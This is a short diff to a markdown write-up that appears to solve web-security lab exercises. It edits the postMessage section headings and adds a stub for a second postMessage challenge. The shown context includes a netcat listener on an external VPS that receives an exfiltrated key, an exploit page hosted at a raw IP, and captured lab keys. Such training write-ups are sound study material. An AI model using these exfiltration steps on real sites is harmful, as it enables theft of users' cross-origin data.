@@ -175,7 +175,7 @@ Solution
 - On your vps `$ nc -lvp 1337`
 - We get the key as `User-Agent: 4b25aabc-4dce-43d4-9f86-49327d4548c0`
 
-### postMessage()
+### postMessage() I
 
 - "The window.postMessage() method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it."
 - However, if the application relies on cookies and the opened page sends back sensitive information to the opening page without enforcing a targetOrigin, it's possible for a malicious page to get access to this sensitive information by getting users to visit a malicious page.
@@ -202,5 +202,15 @@ Success
 http://18.191.42.249/pm1.html
 15492096-e7fc-4675-b36d-d9d4f99a304e
 ```
+
+
+### postMessage() II
+
+- When you hit share `window.open("/key/0","ptlabdata0","height=200,width=150")`
+
+
+
+
+
 
 
